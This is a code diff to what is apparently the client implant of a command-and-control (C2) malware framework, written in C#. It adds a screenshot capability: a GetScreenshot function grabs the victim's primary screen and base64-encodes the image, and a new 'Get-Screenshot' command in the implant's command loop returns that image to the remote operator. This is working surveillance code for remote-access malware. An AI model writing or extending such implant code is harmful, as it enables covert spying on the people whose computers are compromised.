@@ -22,6 +22,9 @@ using Microsoft.Win32;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
 
 namespace C2Client
 {
@@ -963,6 +966,32 @@ namespace C2Client
                 return res;
         }
 
+        [DllImport("User32.dll")]
+        private static extern int SetProcessDPIAware();
+        public string GetScreenshot()
+        {
+            if (Environment.OSVersion.Version.Major >= 6)
+            {
+                SetProcessDPIAware();
+            }
+
+            SetProcessDPIAware();
+
+            Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                           Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
+
+            Rectangle captureRectangle = Screen.PrimaryScreen.Bounds;
+            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
+            //Console.WriteLine( captureRectangle.Size);
+            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+            ImageConverter ic = new ImageConverter();
+            byte[] imagebytes = (byte[])ic.ConvertTo(captureBitmap, typeof(byte[]));
+
+            string encodedimage= Convert.ToBase64String(imagebytes);
+            //Console.WriteLine(encodedimage);
+            return encodedimage;
+        }
+
         public static void Main(string[] args)
         {
             if (args.Length != 4)
@@ -1355,6 +1384,13 @@ namespace C2Client
 
                     }
 
+                    else if (cmd == "Get-Screenshot")
+                    {
+
+                        Program p = new Program();
+                        cmd = p.GetScreenshot();
+
+                    }
 
                     else
                     {
